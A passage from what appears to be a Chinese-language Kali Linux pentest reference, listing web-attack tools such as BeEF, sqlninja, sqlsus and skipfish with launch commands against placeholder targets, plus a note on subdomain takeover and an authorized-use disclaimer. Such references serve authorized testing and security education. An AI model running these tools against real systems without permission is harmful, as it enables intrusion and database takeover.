- 发现可接管子域 = 可钓鱼/签发证书,属高危发现,报告需附证明截图。

## 其余工具速查

| 工具 | 一句话用途 | 安装包 | 最常用命令 |
|---|---|---|---|
| beef-xss-start | BeEF 服务启动包装脚本 | beef-xss | `sudo beef-xss-start` |
| beef-xss-stop | BeEF 服务停止脚本 | beef-xss | `sudo beef-xss-stop` |
| dirb | 经典字典式 Web 内容扫描(官网示例) | dirb(Kali 默认已装) | `dirb http://<target>/ /usr/share/wordlists/dirb/common.txt` |
| dirbuster | Java GUI 多线程目录爆破器 | dirbuster | `dirbuster` |
| jsql-injection | Java GUI 自动 SQL 注入工具 | jsql-injection | `jsql-injection`(仅 GUI,不支持 headless) |
| sqlninja | MSSQL 注入与接管(xp_cmdshell/提权/Metasploit 联动) | sqlninja | `sqlninja -m t -f sqlninja.conf`(先 `-g` 或编辑配置) |
| sqlsus | MySQL 注入与控制台式利用(Perl) | sqlsus | `sqlsus -g sqlsus.cfg`(编辑后)`sqlsus sqlsus.cfg` 交互输入 `start` |
| paros | 老牌轻量 Web 应用测试代理(Java) | paros | `paros`(CLI: `java -jar /usr/share/paros/paros.jar -newsession <file> -spider -seed <url> -scan`) |
| skipfish | 全自动主动式 Web 应用侦察(Z系,出交互式 sitemap 报告) | skipfish | `skipfish -o <outdir> http://<target>/`(官网示例模式) |
| watobo | 半自动化 Web 应用审计代理(GUI) | watobo | `watobo` |
| webscarab | HTTP(S) 应用分析代理(老牌,GUI) | webscarab | `webscarab` |

---

仅用于已获得书面授权的渗透测试、CTF 竞赛与安全教育场景;未经授权对系统进行测试属于违法行为。
